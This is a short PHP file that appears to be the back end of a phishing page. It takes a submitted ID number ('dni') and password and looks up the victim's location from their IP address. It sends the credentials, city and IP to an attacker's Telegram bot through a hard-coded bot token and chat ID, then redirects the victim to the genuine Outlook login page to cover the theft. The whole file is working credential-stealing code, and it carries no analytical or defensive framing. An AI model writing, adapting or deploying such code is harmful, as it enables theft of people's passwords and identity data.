<?php
$token = '6488778104:AAGcFjtJQgbb7_c_tPwpDLrwzu-Ca7wnCL4';
$website = 'https://api.telegram.org/bot'.$token;

    $ip = $_SERVER["REMOTE_ADDR"];
    $chat_id = "-4020364574";
   


if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    $dni = $_POST['dni'];
    $cpass = $_POST['cpass'];
    
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
$country = $ip_data["country"];
$city = $ip_data["city"];
$isp = $ip_data["isp"];
$code = $ip_data["countryCode"];
echo $ip_data;
    //$time = gmstrftime("%Y. %B %d. %A. %X %Z");
    $agent = $_SERVER["HTTP_USER_AGENT"];
    $ip = $_SERVER["REMOTE_ADDR"];
    

    
    $msg = "\n🤔User entered Password🤔\n📧Dni: => " . $dni . "\n🔑Password: => " . $cpass . "\n=============================  " . "\n City: " . $city . "\n📍 IP: " . $ip . "\n==========================\n";
            
    
     $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
            file_get_contents($url);
    
        




  echo "<script>";
        
        echo "window.location.href='https://outlook.live.com/owa/';";
        echo "</script>";
}

